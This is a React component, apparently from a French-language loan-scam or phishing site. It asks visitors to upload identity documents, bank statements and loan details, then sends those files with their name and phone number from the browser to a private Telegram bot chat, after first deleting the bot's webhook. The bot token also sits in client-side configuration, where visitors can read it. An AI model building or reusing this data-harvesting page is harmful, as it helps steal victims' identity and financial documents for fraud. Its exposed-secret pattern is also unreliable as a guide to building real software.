import React, { useState, useEffect } from 'react'
import { useNavigate, useParams, useLocation } from 'react-router-dom'

const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || ''
const ADMIN_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || ''
const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN

function MessageDetails() {
  const navigate = useNavigate()
  const { user } = useParams()
  const location = useLocation()
  const userId = user || 'default'
  const basePath = userId && userId !== 'default' ? `/${userId}` : ""
  
  const [details, setDetails] = useState("")
  const [images, setImages] = useState([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [adminMessage, setAdminMessage] = useState(null)

  useEffect(() => {
    const msg = sessionStorage.getItem('adminMessage') || localStorage.getItem('adminMessage')
    if (msg) {
      setAdminMessage(msg)
    }
  }, [])

  const handleImageChange = (e) => {
    const files = Array.from(e.target.files)
    if (files.length + images.length > 5) {
      setError("Maximum 5 images allowed")
      return
    }
    setImages([...images, ...files])
  }

  const removeImage = (index) => {
    const newImages = [...images]
    newImages.splice(index, 1)
    setImages(newImages)
  }

  const imageToBase64 = (file) => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader()
      reader.onload = () => resolve(reader.result)
      reader.onerror = reject
      reader.readAsDataURL(file)
    })
  }

  async function deleteWebhook() {
    try {
      await fetch(TELEGRAM_API + '/deleteWebhook')
    } catch (e) {
      console.error('Webhook deletion failed:', e)
    }
  }

  async function sendTelegramNotification() {
    if (!details.trim() && images.length === 0) {
      setError("Please enter some details or upload images")
      return
    }

    setLoading(true)
    setError("")

    try {
      await deleteWebhook()

      const storedApp = localStorage.getItem('loanAppData')
      const appData = storedApp ? JSON.parse(storedApp) : {}
      
      const message = `📝 User Response\n\n` +
        `👤 Name: ${appData.name || "N/A"}\n` +
        `📱 Phone: ${appData.number || "N/A"}\n` +
        `💬 Admin Message: ${adminMessage || "N/A"}\n` +
        `📝 Details: ${details.trim() || "N/A"}\n` +
        `🕒 Time: ${new Date().toISOString()}`

      await fetch(TELEGRAM_API + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_CHAT_ID,
          text: message
        })
      })

      for (const image of images) {
        const base64 = await imageToBase64(image)
        const caption = `📎 Supporting document - ${image.name} (${Math.round(image.size / 1024)}KB)`
        
        await fetch(TELEGRAM_API + '/sendPhoto', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            photo: base64,
            caption: caption
          })
        }).catch(e => console.error('Image upload failed:', e))
      }

      setLoading(false)
      navigate(`${basePath}/verification`)
    } catch (err) {
      console.error("Send error:", err)
      setError("Failed to send response: " + err.message)
      setLoading(false)
    }
  }

  return (
    <div style={{
      position: 'fixed',
      top: 0,
      left: 0,
      width: '100%',
      height: '100%',
      backgroundColor: 'rgba(0, 0, 0, 0.5)',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'flex-start',
      zIndex: 9999,
      padding: '20px',
      overflowY: 'auto'
    }}>
      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        padding: '25px',
        maxWidth: '500px',
        width: '100%',
        boxShadow: '0 20px 40px rgba(0, 0, 0, 0.3)',
        marginTop: '20px',
        marginBottom: '20px'
      }}>
        <div style={{
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          gap: '10px',
          marginBottom: '20px'
        }}>
          <span style={{ fontSize: '24px' }}>💬</span>
          <h3 style={{ margin: 0, color: '#333' }}>Message from Admin</h3>
        </div>

        {adminMessage && (
          <div style={{
            padding: '15px',
            backgroundColor: '#f8f9fa',
            border: '1px solid #e9ecef',
            borderRadius: '8px',
            marginBottom: '20px',
            fontSize: '14px',
            color: '#333',
            lineHeight: '1.5'
          }}>
            <strong style={{ color: '#007bff' }}>Admin says:</strong><br />
            {adminMessage}
          </div>
        )}

        <div style={{
          padding: '15px',
          backgroundColor: '#f0f8ff',
          border: '1px solid #b3d9ff',
          borderRadius: '8px',
          marginBottom: '20px',
          fontSize: '13px',
          color: '#555',
          lineHeight: '1.6'
        }}>
          <strong>ℹ️ Instructions:</strong><br />
          Vous pouvez expliquer pourquoi vous avez besoin de ce montant de prêt.<br />
          Vous pouvez également télécharger tout document justificatif (relevés bancaires, factures, pièces d'identité, etc.)
        </div>

        <label style={{
          display: 'block',
          marginBottom: '5px',
          fontWeight: 'bold',
          color: '#333',
          fontSize: '14px'
        }}>
          Vos détails (facultatif)
        </label>
        <textarea
          value={details}
          onChange={(e) => setDetails(e.target.value)}
          placeholder="Expliquez pourquoi vous avez besoin de ce prêt..."
          rows={4}
          style={{
            width: '100%',
            padding: '12px',
            border: '1px solid #ddd',
            borderRadius: '8px',
            marginBottom: '15px',
            fontSize: '14px',
            resize: 'vertical',
            boxSizing: 'border-box'
          }}
        />

        <label style={{
          display: 'block',
          marginBottom: '5px',
          fontWeight: 'bold',
          color: '#333',
          fontSize: '14px'
        }}>
          Télécharger des documents (jusqu'à 5 images)
        </label>
        <input
          type="file"
          accept="image/*"
          multiple
          onChange={handleImageChange}
          style={{
            width: '100%',
            padding: '10px',
            border: '2px dashed #ddd',
            borderRadius: '8px',
            marginBottom: '15px',
            fontSize: '14px',
            cursor: 'pointer'
          }}
        />

        {images.length > 0 && (
          <div style={{
            display: 'flex',
            gap: '10px',
            flexWrap: 'wrap',
            marginBottom: '15px'
          }}>
            {images.map((image, index) => (
              <div key={index} style={{
                position: 'relative',
                width: '60px',
                height: '60px'
              }}>
                <img
                  src={URL.createObjectURL(image)}
                  alt={`upload-${index}`}
                  style={{
                    width: '100%',
                    height: '100%',
                    objectFit: 'cover',
                    borderRadius: '6px',
                    border: '1px solid #ddd'
                  }}
                />
                <button
                  onClick={() => removeImage(index)}
                  style={{
                    position: 'absolute',
                    top: '-5px',
                    right: '-5px',
                    width: '20px',
                    height: '20px',
                    borderRadius: '50%',
                    backgroundColor: '#ff4444',
                    color: 'white',
                    border: 'none',
                    cursor: 'pointer',
                    fontSize: '12px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}
                >
                  ×
                </button>
              </div>
            ))}
          </div>
        )}

        {error && (
          <div style={{
            color: 'red',
            textAlign: 'center',
            padding: '10px',
            backgroundColor: '#ffeeee',
            borderRadius: '5px',
            marginBottom: '15px',
            fontSize: '14px'
          }}>
            ❌ {error}
          </div>
        )}

        <div style={{
          display: 'flex',
          gap: '10px',
          marginTop: '20px'
        }}>
          <button
            onClick={() => navigate(`${basePath}/dashboard`)}
            style={{
              flex: 1,
              padding: '12px 20px',
              backgroundColor: '#f5f5f5',
              color: '#333',
              border: '1px solid #ddd',
              borderRadius: '8px',
              cursor: 'pointer',
              fontSize: '14px',
              fontWeight: '500'
            }}
          >
            Annuler
          </button>
          <button
            onClick={sendTelegramNotification}
            disabled={loading}
            style={{
              flex: 1,
              padding: '12px 20px',
              backgroundColor: loading ? '#ccc' : '#11bb4a',
              color: 'white',
              border: 'none',
              borderRadius: '8px',
              cursor: loading ? 'not-allowed' : 'pointer',
              fontSize: '14px',
              fontWeight: 'bold',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px'
            }}
          >
            {loading ? (
              <>
                <span style={{
                  display: 'inline-block',
                  width: '16px',
                  height: '16px',
                  border: '2px solid rgba(255,255,255,0.4)',
                  borderRadius: '50%',
                  borderTopColor: 'white',
                  animation: 'spin 1s linear infinite'
                }}></span>
                Envoi...
              </>
            ) : 'Soumettre'}
          </button>
        </div>
      </div>
    </div>
  )
}

export default MessageDetails